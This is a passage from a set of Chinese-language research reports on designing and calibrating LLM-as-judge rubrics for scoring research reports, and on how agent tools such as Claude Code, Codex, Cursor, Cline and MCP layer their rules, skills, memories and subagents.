evaluation`，而不是一把大尺子打天下。[S3]\\n\\n这说明：只写四个抽象维度名，再让 judge 自己脑补评分标准，不是“轻量做法”，而是官方已经明确不推荐的做法。\\n\\n### 2. 2026 年的新 judge 研究已经把“rubric 本身的坏设计”定义成核心错误源\\n\\n- [事实] `Rethinking Rubric Generation` 直接指出 rubrics 常见四类问题：`lack coverage`、`conflate dimensions`、`misalign preference direction`、`contain redundant or highly correlated criteria`；这些问题会直接降低 judge accuracy。[S9]\\n- [事实] 同一论文提出的改进方向不是“换更强 judge”，而是把粗 rubrics `decompose` 成更细、更可区分的 criteria，并过滤掉冗余或方向错误的条目。[S9]\\n- [事实] `AdaRubric` 进一步指出：固定 rubric 无法捕捉任务真正重要的东西，不同任务需要不同维度；论文还专门提出 `DimensionAwareFilter`，用来防止高分维度掩盖关键维度失效。[S10]\\n- [事实] `Beyond the Illusion of Consensus` 指出，很多所谓 judge 共识其实是 `surface heuristics` 上的共识，而不是对真正质量的共识；论文显示，仅仅共享 rubric 结构就能恢复 `62%` 的总 agreement，而基于领域知识动态生成 rubric 会得到更有意义的评估。[S12]\\n\\n这说明：`4b` 里的关键问题不是“rubric 有没有”，而是 `rubric 是否覆盖正确、是否把维度分干净、是否允许某个维度把另一个致命缺陷盖过去`。\\n\\n### 3. 长报告评估已经不再把“结构”理解为排版，而是理解为可审计逻辑\\n\\n- [事实] `ReportLogic` 明确指出，当前很多评估框架忽视了报告的 `logical quality`；它把报告质量拆成三层：\\n  1. `Macro-Logic`：是否有统一分析主线。\\n  2. `Expositional-Logic`：是否提供必要上下文并层层推进。\\n  3. `Structural-Logic`：结论是否能通过显式 `claim-support` 被追溯验证。[S8]\\n- [事实] 同一论文还指出，现成 off-the-shelf LLM judges 经常被 `verbosity` 等表层 cue 影响，而且 reasoning mode 甚至可能掩盖真实存在的 support relation 断裂。[S8]\\n\\n这说明：如果本项目里的 `structure` 维度只是“标题清不清楚”“段落像不像报告”，那它评到的是文风秩序，不是报告可靠性。\\n\\n### 4. 最新 report-level benchmark 已经把 citation、statement、support 通道拆开做\\n\\n- [事实] `ReportBench` 明确把评估对象拆成两类关键维度：\\n  1. `cited literature` 的质量与相关性。\\n  2. 报告中 statements 的 `faithfulness / veracity`。[S7]\\n- [事实] 同一工作并不是让 judge 直接读完全文打分，而是先 `extract citations and statements`，再分别检查引用内容是否忠实于原文，以及未引用 claims 是否能被外部证据支持。[S7]\\n- [事实] `ReportLogic` 同样把结论支撑关系单独拎出来，不把它埋进整体流畅度或整体结构感。[S8]\\n\\n这说明：对长报告来说，`citation quality`、`statement faithfulness`、`claim-support` 不单列，本身就是方法缺陷，不是实现细节。\\n\\n### 5. 最强 research/report benchmarks 已经全面转向细粒度 rubric，而不是整体印象 rubric\\n\\n- [事实] `ResearchQA` 从 75 个研究领域中蒸馏出 `21K queries` 与 `160K rubric items`，rubric item 直接写成 query-specific criteria，例如 `citing papers`、`making explanations`、`describing limitations`。[S4]\\n- [事实] 同一论文的 error analysis 显示，最强系统也只完整覆盖了不到 `11%` 的 citation rubric items，limitations 与 comparisons 也大量漏掉。[S4]\\n- [事实] `ResearchRubrics` 构建了 `2,500+` 个专家 rubrics，并指出领先 deep research agents 的平均 rubric compliance 仍低于 `68%`，主要问题是 `missed implicit context` 与 `inadequate reasoning about retrieved information`。[S5]\\n- [事实] `DeepResearch Bench II` 为 132 个 grounded research tasks 构建了共 `9,430` 条细粒度 binary rubrics，覆盖 `information recall`、`analysis`、`presentation` 三类，而不是一个 overall quality score。[S6]\\n- [事实] `PaperBench` 把复杂研究复现任务层级化拆成 `8,316` 个 individually gradable tasks，并额外建立 judge benchmark，而不是默认“只要有 rubric，judge 就天然可靠”。[S13]\\n\\n这说明：如果当前项目还打算依赖一个 `四维粗 rubric + overall score` 的方案，它其实已经落后于 2025-2026 的主流设计。\\n\\n### 6. 2026 年的稳健方法开始要求 evidence-anchored rubric，而不是自然语言大概意思\\n\\n- [事实] `RULERS` 归纳了三个 recurrent failure modes：\\n  1. `rubric instability caused by prompt sensitivity`\\n  2. `unverifiable reasoning that lacks auditable evidence`\\n  3. `scale misalignment with human grading boundaries`。[S11]\\n- [事实] 它的解法是把 natural-language rubrics 编译成 `versioned immutable bundles`，并配合 `deterministic evidence verification`，结论是可靠 judge 需要 `executable rubrics, verifiable evidence, and calibrated scales`，而不只是 prompt phrasing。[S11]\\n\\n这说明：rubric 如果不能落实到可检查 evidence，它就更像提醒词，不像评分协议。\\n\\n## 推断\\n\\n### 1. 对本项目而言，最大的 4b 失败模式是“四维名字存在，但真正要评的东西没有被操作化”\\n\\n- [推断 | 高置信度] 如果系统只让 judge 给 `coverage / depth / structure / novelty` 四项打分，但不给出明确子项，它大概率会出现下面的错位：\\n  1. `coverage` 被理解成“提到的话题多不多”，而不是“关键问题、关键证据、关键限制条件是否覆盖”。\\n  2. `depth` 被理解成“写得长不长、像不像分析”，而不是“是否解释机制、权衡、因果和不确定性”。\\n  3. `structure` 被理解成“排版像不像报告”，而不是“是否有统一分析主线和可追溯 support”。\\n  4. `novelty` 被理解成“说法新不新鲜”，而不是“是否在证据约束下形成非平庸综合”。\\n- [推断 | 高置信度] 这种错位不会表现为随机误差，而会系统性奖励 `长、顺、像咨询报告` 的文本。[S2][S8][S9]\\n\\n### 2. `structure` 如果不拆成逻辑子项，就会稳定漏检“好看但不可信”的报告\\n\\n- [推断 | 高置信度] 本项目里的 `structure` 维度，如果只看目录、层级、行文顺序，就会把 `形式组织` 和 `逻辑可审计性` 混为一谈。\\n- [推断 | 高置信度] 参考 `ReportLogic`，真正影响 report quality 的至少有三层：\\n  1. 是否围绕同一分析主线推进。\\n  2. 是否给读者补齐必要上下文。\\n  3. 是否能把关键结论追溯到具体 support。\\n- [推断 | 高置信度] 若不拆这三层，系统会把“结构工整但 support 断裂”的报告误判为高结构分。[S8]\\n\\n### 3. 不把 `citation / statement / claim-support` 分列，会直接污染 top/bottom 10% 特征归纳\\n\\n- [推断 | 高置信度] 当前项目目标不是只给 475 份报告打分，而是要找 `top/bottom 10%` 的共性特征。若评分结果里没有单独记录：\\n  1. citation coverage / relevance\\n  2. statement faithfulness\\n  3. claim-support completeness\\n  4. limitations / comparisons coverage\\n  那么后续只能总结出“高分报告看起来更完整、更流畅”，而很难总结出“高分报告真正做对了什么”。\\n- [推断 | 高置信度] 这会让最终特征库偏向表面风格特征，而不是证据与逻辑特征。[S4][S7][S8]\\n\\n### 4. `维度掩盖` 会是四维加权总分里的隐形大坑\\n\\n- [推断 | 高置信度] `AdaRubric` 特别提出 `DimensionAwareFilter` 来防止高分维度掩盖 dimension-level failures，这对本项目很直接：一个报告可能在 `coverage` 和 `novelty` 上看起来很强，但 `claim-support` 或 `limitations` 很差。\\n- [推断 | 高置信度] 如果系统允许这些维度被线性加权抵消，那么最终高分样本会混入“观点密集但证据不足”的报告，而这正是后续最不该被当作 top 10% 样板的类型。[S10]\\n\\n### 5. 一个固定通用 rubric 很可能压不住 475 份 heterogeneous research reports\\n\\n- [推断 | 中高置信度] 这 475 份报告虽然都属于同一个研究 runner 体系，但主题、信息密度、证据来源和任务形态仍然可能差异很大；`ResearchQA` 和 `AdaRubric` 都在说明：不同任务真正重要的 coverage item 与 failure mode 并不相同。[S4][S10]\\n- [推断 | 中高置信度] 因而，一个完全固定、完全通用的 rubric 最容易漏掉：\\n  1. 某些主题必须出现的限制条件\\n  2. 某些主题必须出现的 comparison axis\\n  3. 某些主题必须具备的 citation health\\n- [推断 | 中高置信度] 更稳的做法不是“每篇报告一套完全新 rubric”，而是 `通用骨架 + topic-sensitive coverage slots`。\\n\\n## 常见盲区总表\\n\\n| 盲区 | 典型表现 | 为什么会失败 | 对本项目的直接后果 |\\n| --- | --- | --- | --- |\\n| `coarse rubric only` | 只有四个大维度名，没有明确子项 | judge 会用自己的隐含标准补全 | 分数更像 judge 审美，不像项目标准 |\\n| `structure as layout` | 把结构理解成标题、段落、格式整齐 | 漏掉统一主线、上下文铺垫、claim-support | 好看但不可信的报告被高估 |\\n| `citation/support merged` | 用一个“groundedness”或“可信度”笼统表示 | 引用质量、statement faithfulness、support completeness 是不同问题 | 无法知道报告究竟错在引用、断言还是推理衔接 |\\n| `dimension masking` | 高 coverage / novelty 抵消 support 缺陷 | 关键维度失败被总分吞掉 | top 10% 混入证据薄弱样本 |\\n| `fixed rubric for all reports` | 所有主题共用一套 coverage 规则 | 任务关键点不同，通用 rubric 会漏掉 domain-specific 要求 | 不同主题间的分数不可解释 |\\n| `no limitations/comparisons column` | 只看主体观点，不看边界与对比 | 高质量研究报告的重要价值正来自边界和比较 | depth 与 coverage 被系统性高估 |\\n\\n## 建议\\n\\n### 1. 把四个主维度改造成“主维度 + 原子子项”的 rubric 结构\\n\\n- [建议 | 前提：仍以 `coverage / depth / structure / novelty` 为顶层框架] 至少把每个维度拆成 judge 可执行的子项：\\n  1. `coverage`：关键问题、关键证据类型、关键限制条件、关键比较维度。\\n  2. `depth`：机制解释、因果/权衡、证据综合、不确定性处理。\\n  3. `structure`：分析主线、上下文铺垫、段间推进、claim-support。\\n  4. `novelty`：非平庸综合、可迁移框架、证据约束下的新视角。\\n- [建议 | 前提：希望减少 judge 自由发挥] 每个子项都给出分档定义和典型正反例，而不是只给一段抽象描述。[S2][S3][S9]\\n\\n\\n====\\nFILE: reports/round1-dimension4c-session-quality-scorer-calibration-and-deployment-boundaries.md\\n# Round 1 · 维度4c：Session 质量评分系统的校准与落地边界\\n\\n- 完成时间：2026-04-18 05:16（Asia/Shanghai）\\n- 研究范围：2025-2026 可访问资料；官方页面与论文统一于 2026-04-18 检索\\n- 子任务范围：聚焦 `人工校准缺失`、`judge 漂移`、`阈值切桶`、`审计缺失` 的边界条件；不重复展开 4a 的 judge 偏置综述与 4b 的 rubric/结构设计问题\\n- 输出规则：事实、推断、建议分开写；事实带来源，推断标注置信度，建议写清前提\\n\\n## TL;DR\\n\\n- 对这个项目而言，judge 不是“打分器”，而是 `需要持续校准的测量系统`。如果没有 human anchors、版本锁定、阈值回测和审计记录，`top/bottom 10%` 更像一次性排序结果，不像可信结论。[S2][S3][S4][S9][S13][S14][S16]\\n- 2025-2026 的稳定共识不是“找到最强 judge”，而是：`人工校准 -> 版本化评测栈 -> 边界样本复判 -> 持续审计`。自动 judge 可以放大覆盖面，但不能跳过这些环节。[S5][S6][S7][S9][S10][S11][S12]\\n- 四个最关键的落地边界已经很清楚：\\n  1. `没有人工锚点集`，就没有可信阈值。\\n  2. `换 judge / prompt / rubric / scale 后不回归`，旧分和新分就不可比。\\n  3. `拿单次 scalar 分数直接切 top/bottom 10%`，边界样本会被随机性和刻度设计放大误分。\\n  4. `没有 audit trail 和人工纠错入口`，系统就无法解释、修复或追责错分。[S6][S7][S8][S9][S11][S13][S14][S15][S16][S18]\\n- 对 `475 reports` 的最小可信协议，不应是“全量跑完就出榜”，而应是：`anchor set 校准 -> 全量初评分 -> 边界区多次/成对复判 -> 人工抽样审计 -> 冻结版本后再做 top/bottom 10% 特征归纳`。[S1][S2][S3][S9][S11][S14][S16]\\n\\n## 事实\\n\\n### 1. 官方文档和生产系统都把“人工校准”当成前提，不当成可选项\\n\\n- [事实] OpenAI `Evaluation best practices` 明确写到：评测不能只看数值分，应与 human judgment 结合；`ignoring human feedback` 被列为反模式，同时要求 `maintain agreement`，用人工反馈校准自动评分。[S2]\\n- [事实] Anthropic 在 `Demystifying evals for AI agents` 中明确指出：model-based graders 的弱点之一就是 `requires calibration with human graders for accuracy`；同一任务可以有多个 graders，评分既可以是加权阈值，也可以是 binary 或 hybrid。[S3]\\n- [事实] LangSmith 的 `Align Evaluator` 流程是先让人类专家标注，再测 judge prompt 与人工标签的一致性，再反复迭代；平台把 `alignment score` 直接定义为 judge 与 human expert 一致的比例。[S6]\\n- [事实] LangSmith 还专门提供 `audit evaluator scores`，允许人类直接改 evaluator 分数，并把纠错 explanation 回灌到 few-shot examples 中。[S7]\\n- [事实] OpenAI `GDPval` 的做法是先由职业专家 blind compare deliverables，再训练 automated grader 去逼近专家偏好；OpenAI 明确说该 automated grader `not yet as reliable as expert graders`，因此不拿它替代专家。[S5]\\n\\n这说明：在 2025-2026 的一手实践里，`人工校准缺失` 不是一个“小瑕疵”，而是测量链条没有闭环。\\n\\n### 2. judge 漂移本质上是“量尺漂移”，不是普通噪声\\n\\n- [事实] `Evaluative Fingerprints` 显示，LLM judges `consistent with themselves`，但彼此并不一致；跨 judge 的 inter-judge agreement 接近零，而同一家族模型之间也能被高准确率区分出来。论文结论很直接：LLM judges `are not interchangeable instruments measuring a shared construct`。[S13]\\n- [事实] Braintrust 在 2026-02-18 的 eval-driven development 文章里明确要求对每次评测保留 `dataset version, prompt version, model configuration, and judge settings` 的完整 lineage，并指出如果不监控 judge drift，即便阈值表面达标，eval 也会逐渐失去可靠性。[S9]\\n- [事实] Anthropic 的 Evaluation Tool 文档支持 `prompt versioning`，并强调修改 prompt 后要重新跑整个 eval suite，比较不同 prompt version 的结果。[S12]\\n- [事实] Braintrust 进一步明确：`model and provider changes are treated as configuration updates that require evaluation`，即模型升级本身就是一次重新验证，而不是可以默认沿用旧刻度的热切换。[S9]\\n\\n这意味着：只要 judge model、judge prompt、rubric、grading scale 或 threshold config 有任何一个变了，系统就进入了新的 measurement regime。\\n\\n### 3. 阈值切桶不是“选一个百分点”这么简单，而是统计与标尺问题\\n\\n- [事实] `Causal Judge Evaluation` 直接指出：未经校准的 judge 分数可能 `invert rankings entirely`；raw judge scores 的 naive confidence intervals 甚至达到 `0% coverage`。论文还明确写到，在 transport audit 失败时，系统应该 `refuse level claims`，而不是硬报一个看似精确的水平值。[S14]\\n- [事实] `Noisy but Valid` 提出用一小批 human-labeled calibration set 估计 judge 的 TPR/FPR，再据此计算 `variance-corrected critical threshold`；作者强调只有这样才能在 calibration uncertainty 存在时仍保持有限样本 validity。[S15]\\n- [事实] `How to Correctly Report LLM-as-a-Judge Evaluations` 指出 naive evaluation scores 会因 judge sensitivity / specificity 不完美而产生偏差，因此需要 bias correction，并且置信区间要同时考虑测试集与 calibration set 的不确定性。[S16]\\n- [事实] `Grading Scale Impact on LLM-as-a-Judge` 发现 grading scale 本身会显著改变 human-LLM alignment；汇总六个 benchmark 后，`0-5` scale 的整体对齐度最高。[S17]\\n- [事实] Microsoft Research 对 `rating indeterminacy` 的工作指出：如果任务本身允许多个合理评分，但验证流程强迫人和 LLM 只交一个 forced-choice gold label，那么 judge validation 会被系统性偏置；其标准验证流程选出来的 judge，可能比响应集合式验证选出来的 judge `差 30%`。[S18]\\n- [事实] Braintrust 在 2026-04-03 的文章里给出一个很实用的经验值：大多数团队会先准备 `50-100` 个 `per scoring dimension` 的人类标注样本来验证 judge prompt，且应重点覆盖最模糊的相邻分档边界。[S11]\\n\\n这说明：`top/bottom 10%` 的 cutline 不是一个纯业务阈值，而是依赖 calibration、scale design、uncertainty estimation 和边界样本验证的统计判断。\\n\\n### 4. 审计缺失会让评分系统失去治理能力，而不只是失去可观察性\\n\\n- [事实] LangSmith 的 audit logs 提供 `tamper-resistant record`，用于记录组织中的管理和配置动作，目的就是让团队能回答“谁改了 evaluator / 配置、何时改的、改了什么”。[S8]\\n- [事实] Braintrust 的 2026 文章强调，development、CI gate 和 production monitoring 应共享同一套 scoring logic 和 thresholds；如果这些定义在不同环节漂移，团队最终会不知道 CI 里拦的是什么、线上监控看的又是什么。[S9]\\n- [事实] Braintrust 的 human review 文档明确把人工反馈定义为 `essential ground truth`，不仅用于评价实验结果，也用于 `assess the efficacy of automated scoring methods`、`label categorical data and provide corrections`、`track quality trends over time`。[S10]\\n- [事实] Braintrust 还明确写到：人类 spot-check 不会在成熟系统中消失，只是会从大面积人工评审收缩到 `novel failures, scorer recalibration, and high-stakes edge cases`。[S11]\\n\\n这说明：没有 audit trail、人工纠错和版本记录的 judge 系统，不能算“上线”，只能算“跑过一次”。\\n\\n### 5. 当前项目的任务形态，会把以上边界问题全部放大\\n\\n- [事实] 当前项目的评分对象是固定的 `475 reports` 语料池，目标不是一般性质量观察，而是要切出 `top/bottom 10%` 并做特征归纳。[S1]\\n- [事实] 结合前两轮结论，当前系统已经明确是 `report-level` deliverable evaluation，而不是原始对话评分；且 `结构逻辑`、`claim-support` 与 `novelty` 都被视为高风险维度。[S1]\\n\\n这意味着：本项目比一般“看个均分变化”的场景更依赖校准，因为它的核心输出是 `边界切桶 + 特征解释`，而不是一个粗略健康度看板。\\n\\n## 推断\\n\\n### 1. 对本项目而言，`没有 calibration set 就没有 cutline`\\n\\n- [推断 | 高置信度] 如果没有一套覆盖 `高质量 / 低质量 / 长但空 / 短但密 / 支撑强但结构弱 / 结构顺但洞见假` 的人工锚点样本，那么任何 `top 10% / bottom 10%` 都只是按 judge 当前偏好切桶，而不是按项目真正想要的质量定义切桶。\\n- [推断 | 高置信度] 这类错误的危险不在于均值偏一点，而在于会直接污染后续特征归纳，让系统把某类 judge 偏爱的文风误当成“高质量样板”。[S2][S5][S6][S11][S14][S16]\\n\\n### 2. judge、rubric、scale、threshold 必须被当成同一个“版本化测量栈”\\n\\n- [推断 | 高置信度] 对 `475 reports` 来说，只记录 `judge_model=某某` 远远不够；真正决定分数语义的至少包括：\\n  1. judge model\\n  2. judge prompt\\n  3. rubric version\\n  4. grading scale\\n  5. threshold / cutline 规则\\n  6. calibration set version\\n  7. human audit policy\\n- [推断 | 高置信度] 只要其中任意一项改变，都不能把新分数和旧分数直接放在同一个排行表里解释。[S9][S12][S13]\\n\\n### 3. `top/bottom 10%` 最危险的不是极端样本，而是 cutline 附近的灰区样本\\n\\n- [推断 | 高置信度] 真正稳定的高分或低分样本，通常跨 judge / 跨 trial 也比较稳定；最容易被 scale design、judge variance、forced-choice 压缩和 prompt 微调影响的，是紧贴百分位边界的那一圈样本。[S3][S11][S14][S15][S17][S18]\\n- [推断 | 高置信度] 因而 `top/bottom 10%` 不应被当成“单次全量打分后自然浮现”的事实，而应被当成“需要专门复判的决策边界”。\\n\\n### 4. `内部一致` 不能替代 `对人类有效`\\n\\n- [推断 | 高置信度] 一个 judge 体系即使多次重跑都很稳定，甚至多个 LLM judges 彼此也能达成看起来不错的一致性，仍然不能证明它对当前项目的“高质量报告”定义是有效代理。\\n- [推断 | 高置信度] 对这个题目，真正重要的不是“judge 彼此像不像”，而是“judge 是否与人类对 top/bottom 10% 的选择一致，尤其是在结构逻辑、claim-support 和 novelty 这些高风险维度上”。[S5][S6][S9][S13][S18]\\n\\n### 5. 审计缺失会把系统从“评分系统”降级为“排行榜生成器”\\n\\n- [推断 | 高置信度] 如果每份 report 最终只留下四个分数和一个总排序，而没有：\\n  1. rationale\\n  2. evidence span\\n  3. judge / rubric / threshold version\\n  4. human correction history\\n  5. disagreement / variance 标记\\n  那么这个系统后续既不能解释 top/bottom 10% 为什么成立，也不能定位是 judge、rubric、阈值还是样本本身出了问题。\\n- [推断 | 高置信度] 这会直接削弱 Round 2 / Round 3 的设计价值，因为后面再做 spec 时，没有足够证据知道应当固化什么、修正什么。\\n\\n## 落地边界总表\\n\\n| 落地边界缺口 | 典型表现 | 为什么危险 | 对本项目的直接后果 |\\n| --- | --- | --- | --- |\\n| `no calibration set` | 直接全量评分、直接切 top/bottom 10% | 不知道 judge 贴不贴近人类标准 | 特征归纳会被 judge 偏好污染 |\\n| `no measurement versioning` | 换模型/换 prompt/换 rubric 后继续和旧分混算 | 量尺已变，分数语义变化 | 多轮结果不可比 |\\n| `single-pass cutline` | 单次 scalar score 直接定边界 | cutline 附近最易受随机性影响 | 错把灰区样本放入 top/bottom 桶 |\\n| `no uncertainty handling` | 没有重复评分、没有 disagreement 标记、没有灰区 | 小幅分差被误当真差异 | 边界决策不稳 |\\n| `no audit trail` | 不记录 judge/rubric/threshold 改动和人工纠错 | 无法解释或追责错分 | 后续 spec 失去可复盘性 |\\n| `no human override path` | 自动 judge 一票定终局 | 高风险维度无法兜底 | novelty/结构逻辑错分直接进最终结论 |\\n\\n## 建议\\n\\n### 1. 先建 `人工锚点集`，再谈全量排序\\n\\n- [建议 | 前提：本轮目标是把 475 份报告做成可信排序输入] 先抽一小批 anchor reports 做人工标注，不少于一套能覆盖 `高 / 低 / 边界 / 对抗` 情况的样本集；如果采用 Braintrust 给出的实践参考，可优先准备每个核心维度 `50-100` 个标注样本，并把精力优先放在最模糊的相邻分档边界。[S11]\\n- [建议 | 前提：希望控制成本] 不必一开始就人工通读 475 份，但必须先有人类黄金样本，否则所有后续阈值设计都没有对齐基准。\\n\\n### 2. 把 `judge stack` 全量版本化，而不是只记模型名\\n\\n- [建议 | 前提：后续会迭代 judge prompt、rubric 或 scoring protocol] 每次评测结果都至少记录：\\n  1. `judge_model`\\n  2. `judge_prompt_version`\\n  3. `rubric_version`\\n  4. `grading_scale_version`\\n  5. `threshold_policy_version`\\n  6. `calibration_set_version`\\n  7. `audit_policy_version`\\n- [建议 | 前提：希望可追踪分数变化来源] 任何一项变化后，都先回归 anchor set，再决定是否接受新版本进入主流程。[S9][S12][S13]\\n\\n### 3. 采用 `粗而有锚` 的分档制，不要用过细或自由浮动的刻度\\n\\n- [建议 | 前提：仍希望保留 scalar rubric] 优先使用 `0-5` 或同等级别的有限离散分档，并为每一档配 anchored examples；避免 10 分制、百分制或让 judge 自己定义小数分。\\n- [建议 | 前提：要尽量贴近人类判断] 2026 年 scale 研究显示 `0-5` 平均对齐最好，但这仍应先在本地 anchor set 上回测，不要把论文结论当成免验证模板。[S17]\\n\\n====\\nFILE: reports/round1-dimension5-agent-skill-system-use-cases-and-layering.md\\n# Round 1 / 维度5：Agent Skill 管理系统的适用场景与分层\\n\\n- 完成时间：2026-04-18 04:56（Asia/Shanghai）\\n- 研究窗口：2025-2026\\n- 研究对象：Claude Code（`CLAUDE.md` / project rules / custom slash commands / subagents / MCP）、Codex（`AGENTS.md` / rules / skills / memories / subagents / plugins）、Cursor（rules / memories / AGENTS.md）、Cline（rules / skills / workflows / hooks / subagents / MCP）、MCP primitives（prompts / resources / tools）\\n- 研究目标：回答“什么机制适合什么场景、什么用户层级、什么成熟度阶段”，为下一代 skill system 的 layering 设计提供分层依据\\n- 研究方法：优先使用官方 docs / official spec；统一检索日期 2026-04-18\\n\\n## TL;DR\\n\\n- 2025-2026 最稳定的共识不是“所有能力都做成 skill”，而是把 agent system 拆成至少 6 个正交层：`always-on instructions`、`scoped rules`、`on-demand skills/workflows`、`capability bus (MCP/tools)`、`memory`、`parallelization/subagents`。[S1][S2][S3][S4][S6][S7][S8][S9][S10][S11][S12][S13][S14][S15][S17][S18]\\n- 对“稳定约束”最合适的是 `AGENTS.md / CLAUDE.md / Project Rules`；对“重复但不是每次都要加载的方法”最合适的是 `Codex/Cline skills` 或 `Claude custom slash commands / Cline workflows`；对“实时访问外部系统”最合适的是 `MCP tools/resources/prompts`；对“跨会话 recall”最合适的是 `memories`；对“并行探索/审查”最合适的是 `subagents`。[S1][S3][S4][S6][S7][S8][S9][S10][S11][S12][S13][S14][S17][S18]\\n- 产品差异不在“有没有 skill”，而在 `激活方式` 与 `控制边界`：\\n  - Codex/Cline：显式把 `skills` 做成 progressive disclosure 的工作流载体。\\n  - Cursor：把 `rules` 做成主要的持久上下文载体，再用 memories 补自动沉淀。\\n  - Claude Code：以 `CLAUDE.md + project rules + slash commands + subagents + MCP` 组成一个更偏“常驻指令 + 显式命令”的系统。[S1][S6][S7][S8][S9][S10][S11][S12][S13][S15]\\n- 因此，下一代 skill system 不该只有一种 artifact，而应至少支持 5 种 activation mode：`always`、`scoped-auto`、`agent-requested`、`explicit/manual`、`admin-mandated`；再把 `memory` 和 `capability bus` 作为正交层，而不是混进 skill 定义里。\\n- 这也解释了前面三轮共识为什么成立：`skill 不等于 MCP tool，也不等于 rules`。在分层上，skill 更接近“可复用任务方法”，MCP 更接近“能力接入口”，rules 更接近“持续约束”。\\n\\n## 事实\\n\\n### 1. 主流产品都已经把“稳定约束”和“按需方法”拆开\\n\\n- [事实] Codex 把 `skills` 定义为“reusable workflows”的 authoring format，且只在决定使用时加载完整 `SKILL.md`；同时把 `plugins` 定义为分发 unit，把 `rules` 定义成“控制哪些命令能在 sandbox 外运行”的执行策略，而不是 workflow system。[S1][S2]\\n- [事实] Codex 明确写出 memories 只是 local recall layer，要求“required team guidance”仍放在 `AGENTS.md` 或 checked-in docs 中；subagents 也默认只在用户显式要求时才启动。[S3][S4]\\n- [事实] Claude Code 把 `CLAUDE.md` 作为层级化常驻指令文件，project rules 用于按文件类型或子目录做 scoped instructions，自定义 slash commands 用于显式触发的复用 prompt，subagents 用于独立上下文的专门化 delegation。[S6][S7][S8]\\n- [事实] Cursor 把 rules 定义为“system-level instructions to Agent and Inline Edit”，Project/User/AGENTS.md/legacy `.cursorrules` 都属于持久上下文层；它再用 memories 作为“automatically generated rules”，继续强化持久上下文，而不是单独的 workflow/skill layer。[S9][S10]\\n- [事实] Cline 是目前分层表达最清晰的一个：官方 overview 直接区分 `Rules = always-on guidance`、`Skills = domain expertise loaded only when relevant`、`Workflows = explicit task scripts invoked on demand`、`Hooks = programmatic guardrails`、`.clineignore = access boundary`。[S11]\\n- [推断 | 高置信度] 这说明 2025-2026 的真实趋势不是“哪个 artifact 赢”，而是“控制面分层”在收敛：稳定约束、按需 expertise、显式 SOP、程序化 guardrail、外部能力连接，已经被不同产品分别建模。[S1][S2][S6][S8][S9][S11]\\n\\n### 2. MCP 在所有系统里更像 capability bus，不像 skill 本体\\n\\n- [事实] MCP 官方规范把 primitives 明确分成 `Prompts / Resources / Tools`，并给出控制层级：`Prompts = user-controlled`、`Resources = application-controlled`、`Tools = model-controlled`。[S17]\\n- [事实] MCP tools 页面明确说 tools 让模型与外部系统交互，且本质是 model-controlled function invocation，规范还要求 human in the loop 的 UI 与 approval 设计。[S18]\\n- [事实] Claude Code、Codex、Cline 都把 MCP 作为外部工具/数据源接入层，而不是把 MCP 自身描述为完整 workflow artifact。[S1][S6][S8][S13][S17][S18]\\n- [推断 | 高置信度] 所以 MCP 最适合承载“能力接入口”和“实时外部状态”，不适合单独承载长方法论、项目规范或多步 SOP。把 skill system 全部退化成 MCP server 列表，会失去方法和治理层。[S17][S18]\\n\\n### 3. 自动触发并不可靠，激活方式本身就是设计维度\\n\\n- [事实] Codex skills 的触发分为 explicit 和 implicit 两种；implicit matching 依赖 skill `description`，官方要求“write descriptions with clear scope and boundaries”。[S1]\\n- [事实] Cline skills 同样靠 description 驱动 `use_skill` 激活，并明确提醒 description 太模糊就不会按预期触发；Cline workflows 则完全是 slash-command 式显式调用。[S12][S13]\\n- [事实] Cursor rules 细分出 `Always` / `Auto Attached` / `Agent Requested` / `Manual`，本质就是把不同 activation mode 做成一等概念。[S9]\\n- [事实] Claude Code 的 custom slash commands 和 Codex/Cline 的 workflows 都是显式触发面；Claude/Codex/Cline 的 subagents 又都偏显式调用或显式授权，而不是无条件自动分裂任务。[S4][S8][S13][S14]\\n- [推断 | 高置信度] “默认自动触发”只能覆盖一部分场景。凡是高成本、高风险、高分支的能力，产品都在往 `explicit/manual` 或 `agent-requested with description` 收敛，而不是完全隐式化。[S1][S4][S8][S9][S12][S13][S14]\\n\\n## 适用场景分层\\n\\n### 1. 按任务形态分层：什么任务该用什么机制\\n\\n| 任务形态 | 最优主机制 | 次优配套 | 为什么 | 不该主用什么 |\\n| --- | --- | --- | --- | --- |\\n| 仓库级稳定规范：命名、测试命令、架构约束、审批边界 | `AGENTS.md / CLAUDE.md / Project Rules / Cline Rules` | admin policy, local settings | 这是所有任务都应继承的背景，不应该靠用户每次重复描述 | skill、MCP tool |\\n| 路径/文件类型 scoped 规范：前端/后端/文档不同规范 | Cursor nested rules、Claude project rules、Cline conditional rules | directory-local instruction files | 这类信息与文件路径强绑定，适合 auto-attach | global memory |\\n| 复杂但重复的领域方法：迁移、审计、部署、PRD 生成、数据分析 | Codex/Cline skills | Claude custom slash commands, references/scripts | 需要长方法论，但不是每次都要常驻加载 | always-on rules |\\n| 高风险固定流程：发布、回滚、发版检查、incident runbook | explicit workflows / slash commands | hooks, approvals | 需要明确步骤、停机条件、人工确认 | implicit skills |\\n| 实时外部系统操作：GitHub、Slack、Drive、数据库、内部 API | MCP tools/resources/prompts | workflow or skill orchestration | 重点是 access + live state，不是 instruction body | plain rules |\\n| 跨会话 recall：偏好、tech stack、已知坑 | memories | checked-in docs for must-follow guidance | 适合 recall，不适合承载必须遵守的制度 | admin policy 替代 memory |\\n| 大范围并行探索、代码审查、对比研究 | subagents | skills for each subtask | 重点是 separate context 和 parallelism | single-thread giant prompt |\\n\\n- [推断 | 高置信度] 这一表几乎是把 Codex、Claude Code、Cursor、Cline、MCP 官方设计合并后的公共语义层。下一代系统应该直接把这个映射做成产品默认 mental model，而不是让用户自己猜。[S1][S4][S6][S7][S8][S9][S11][S12][S13][S14][S17][S18]\\n\\n### 2. 按用户层级分层：个人、团队、平台看到的 skill system 不一样\\n\\n#### L1. 个人新手 / 单兵使用者\\n\\n适合：\\n- 少量 always-on project instructions\\n- 5-10 条以内的规则\\n- 2-5 个高频 explicit workflows/commands\\n- 极少数清晰命名的 skills\\n- 少量 MCP servers\\n\\n不适合：\\n- 大量 implicit auto-trigger skills\\n- 太多 global memories\\n- 复杂 plugin/distribution 体系\\n\\n原因：\\n- 新手最容易被“看不见的自动行为”困扰。此阶段应该优先追求可见性、可解释性和低维护成本，而不是最大自动化。[S1][S8][S9][S11][S12]\\n\\n#### L2. 高级个人 / 咨询式 power user\\n\\n适合：\\n- 全局 personal rules / memories\\n- repo-local checked-in instructions\\n- 按领域分 skill library\\n- curated MCP capability set\\n- 明确的 manual / agent-requested activation policy\\n\\n原因：\\n- power user 的关键不是更多 context，而是更快地调用正确的方法包和外部能力包。\\n\\n#### 